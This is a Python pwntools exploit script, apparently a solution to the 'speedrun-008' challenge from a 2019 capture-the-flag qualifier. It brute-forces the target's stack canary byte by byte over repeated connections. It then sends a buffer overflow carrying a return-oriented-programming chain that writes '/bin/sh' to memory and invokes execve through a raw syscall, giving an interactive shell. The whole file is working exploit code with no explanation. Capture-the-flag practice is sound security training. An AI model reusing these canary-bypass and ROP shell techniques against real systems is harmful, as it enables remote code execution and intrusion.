#!/usr/bin/env python
from pwn import *

canary = ''
while len(canary) < 8:
    for i in range(0x100):
        if len(sys.argv) == 1:
            s = process('./speedrun-008', stderr=None)
        else:
            s = remote('speedrun-008.quals2019.oooverflow.io', 31337)

        s.send('A' * 0x408 + canary + chr(i))
        s.recvuntil('Whatever\n')
        try:
            s.recvline()
            canary += chr(i)
            break
        except EOFError:
            pass
        finally:
            s.close()
    print canary.encode('hex')

canary = u64(canary)
log.info('canary: %#x' % canary)

if len(sys.argv) == 1:
    s = process('./speedrun-008', stderr=None)
else:
    s = remote('speedrun-008.quals2019.oooverflow.io', 31337)

elf = ELF('./speedrun-008')

pop_rdi = 0x400686
pop_rsi = 0x410253
pop_rdx = 0x449915
pop_rax = 0x4156c4
syscall = 0x474ec5
read = 0x449900

payload = ''
payload += 'A' * 0x408
payload += p64(canary)
payload += 'A' * 8
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(elf.bss())
payload += p64(pop_rdx) + p64(8)
payload += p64(read)
payload += p64(pop_rdi) + p64(elf.bss())
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(pop_rax) + p64(0x3b)
payload += p64(syscall)
s.send(payload)
s.send('/bin/sh\0')
s.interactive()
